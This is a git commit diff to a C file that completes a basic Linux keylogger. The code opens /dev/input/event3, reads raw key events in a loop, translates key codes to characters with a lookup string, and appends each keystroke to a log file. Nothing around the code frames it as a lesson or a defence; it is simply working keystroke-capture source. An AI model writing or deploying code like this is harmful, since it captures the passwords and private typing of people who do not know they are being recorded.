108a2448c655c5351d9579a571c7cfc32a959309
nullst8 <nullst8@proton.me>
2022-07-02 16:43:26 +0530

    sends keys to file(complete)

--- main.c
+++ main.c
@@ -10,11 +10,22 @@ int main(int argc, char *argv[]) {
   struct input_event ev;
   int file_desc = open("/dev/input/event3", O_RDONLY);
   FILE *fp = fopen(LOGFILE, "a");
+  char map[] = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";
 
   while (1) {
     read(file_desc, &ev, sizeof(ev));
+    fflush(fp);
     if ((ev.type == EV_KEY) && (ev.value == 0)) {
-      printf("%d\n", ev.code);
+      switch (ev.code) {
+      case 28:
+        fprintf(fp, "\n");
+        break;
+      case 57:
+        fprintf(fp, " ");
+        break;
+      default:
+        fprintf(fp, "%c", map[ev.code]);
+      }
     }
   }
   return 0;
